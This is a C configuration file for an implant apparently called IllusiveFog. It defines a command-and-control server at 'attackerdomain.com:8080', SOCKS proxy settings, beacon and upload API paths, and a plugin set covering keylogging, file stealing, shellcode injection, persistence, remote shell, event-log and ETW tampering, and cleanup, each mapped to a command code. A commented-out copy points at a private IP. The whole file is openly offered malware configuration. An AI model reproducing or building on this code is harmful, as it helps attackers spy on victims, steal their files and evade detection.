
#include "IllusiveFog.h"
#ifdef SOCKS
 extern char sock_ip[sock_ip_size] = "192.168.75.163";
 extern int sockport = 1080;
 extern BOOL auth_enabled = FALSE;
 extern char socks_auth_user[] = " ";
 extern char socks_auth_pass[] = " ";

#endif

 extern char dest_ip[dest_ip_size] = " attackerdomain.com";
 extern int destport = 8080;
 extern char intial_param1[initial_param_size1] = "u=";
 extern char inital_param2[initial_param_size2] = "&h=";
 extern char inital_param3[initial_param_size3] = "&j=";
 extern char initial_param4[initial_param_size4] = "&y=";
 extern char initial_param5[initial_param_size5] = "&k=";
 extern int socks_timer = 1;//1 second
 extern char agent_info_location[agent_info_location_size] = "/api/search";
 extern char IllusiveFog_agent_post_request[agent_get_request_size] = "/api/fg/"; //server post request
 extern char IllusiveFog_agent_get_request[agent_post_request_size] = "/api/ic/";//
 extern char IllusiveFog_agent_plugin_request[agent_plugin_request_size] = "/api/jf/";
extern char IllusiveFog_agent_error_code_request[agent_plugin_request_size] = "/api/tip/";
//extern char reporter_param1[] = "browse=";
//extern char reporter_param2[] = "show=";
//extern char reporter_param3[] = "id=";
//extern char reporter_error_code_param[] = "ut=";
 extern char reporter_param1[reporter_param_size] = "browse=";
 extern char reporter_param2[reporter_param_size] = "show=";
 extern char reporter_param3[reporter_param_size] = "id=";
 extern char reporter_error_code_param[reporter_param_size] = "ut=";
 extern char SelfSocks[] = "burguler.f";//fix a size for everyone
 extern char PersistPlugin[] = "chillinside.f";
 extern char InjShellCo[] = "dante.f";
 extern char ShellPlugin[] = "visit.f";
 extern char LoadPlugin[] = "opendoors.f";
 extern char EVTXPlugin[] = "whoshe.f";
 extern char ETWPlugin[] = "ripper.f";
 extern char VerbosePlugin[] = "docheckup.f";
 extern char VerboseCounter[] = "docitup.f";
 extern char	CleanupPlugin[] = "hmbye.f";
 extern char	KeyLogPlugin[] = "footsteps.f";
 extern char FileStealerPlugin[] = "givemeall.f";

 extern char IllusiveFog_agent_crash_message[] = "agent_crashed";
 extern char hex_command_shell[] = "0x004010D5";
 extern char hex_command_persistence[] = "0x00401010";
 extern char hex_command_injshell[] = "0x004010C0";
 extern char hex_command_selfsocks[] = "0x004016FE";
 extern char hex_command_load[] = "0x004018SS";
 extern char hex_command_evtx[] = "0x0046AF39";
 extern char hex_command_etw[] = "0x0089AFD2";
 extern char hex_command_verbose[] = "0x004017UU";
 extern char hex_command_unload[] = "0x0050140T";
 extern char hex_command_cleanup[] = "0x004685964";
 extern char hex_command_keylog[] = "0x00547ASD";
 extern char hex_command_file_stealer[] = "0x00895ASR";

//#ifdef SOCKS
//volatile extern char sock_ip[sock_ip_size] = "192.168.75.163";
//volatile extern int sockport = 1080;
//volatile extern BOOL auth_enabled = FALSE;
//volatile extern char socks_auth_user[] = " ";
//volatile extern char socks_auth_pass[] = " ";
//
//#endif
//
//volatile extern char dest_ip[dest_ip_size] = "192.168.10.142";
//volatile extern int destport = 8080;
//volatile extern char intial_param1[initial_param_size1] = "u=";
//volatile extern char inital_param2[initial_param_size2] = "&h=";
//volatile extern char inital_param3[initial_param_size3] = "&j=";
//volatile extern char initial_param4[initial_param_size4] = "&y=";
//volatile extern char initial_param5[initial_param_size5] = "&k=";
//volatile extern int socks_timer = 1;//1 second
//volatile extern char agent_info_location[agent_info_location_size] = "/api/search";
//volatile extern char IllusiveFog_agent_post_request[agent_get_request_size] = "/api/fg/"; //server post request
//volatile extern char IllusiveFog_agent_get_request[agent_post_request_size] = "/api/ic/";//
//volatile extern char IllusiveFog_agent_plugin_request[agent_plugin_request_size] = "/api/jf/";
//extern char IllusiveFog_agent_error_code_request[agent_plugin_request_size] = "/api/tip/";
////extern char reporter_param1[] = "browse=";
////extern char reporter_param2[] = "show=";
////extern char reporter_param3[] = "id=";
////extern char reporter_error_code_param[] = "ut=";
//volatile extern char reporter_param1[reporter_param_size] = "browse=";
//volatile extern char reporter_param2[reporter_param_size] = "show=";
//volatile extern char reporter_param3[reporter_param_size] = "id=";
//volatile extern char reporter_error_code_param[reporter_param_size] = "ut=";
//volatile extern char SelfSocks[] = "burguler.f";//fix a size for everyone
//volatile extern char PersistPlugin[] = "chillinside.f";
//volatile extern char InjShellCo[] = "dante.f";
//volatile extern char ShellPlugin[] = "visit.f";
//volatile extern char LoadPlugin[] = "opendoors.f";
//volatile extern char EVTXPlugin[] = "whoshe.f";
//volatile extern char ETWPlugin[] = "ripper.f";
//volatile extern char VerbosePlugin[] = "docheckup.f";
//volatile extern char VerboseCounter[] = "docitup.f";
//volatile extern char	CleanupPlugin[] = "hmbye.f";
//volatile extern char	KeyLogPlugin[] = "footsteps.f";
//volatile extern char IllusiveFog_agent_crash_message[] = "agent_crashed";
//volatile extern char hex_command_shell[] = "0x004010D5";
//volatile extern char hex_command_persistence[] = "0x00401010";
//volatile extern char hex_command_injshell[] = "0x004010C0";
//volatile extern char hex_command_selfsocks[] = "0x004016FE";
//volatile extern char hex_command_load[] = "0x004018SS";
//volatile extern char hex_command_evtx[] = "0x0046AF39";
//volatile extern char hex_command_etw[] = "0x0089AFD2";
//volatile extern char hex_command_verbose[] = "0x004017UU";
//volatile extern char hex_command_unload[] = "0x0050140T";
//volatile extern char hex_command_cleanup[] = "0x004685964";
//volatile extern char hex_command_keylog[] = "0x00547ASD";
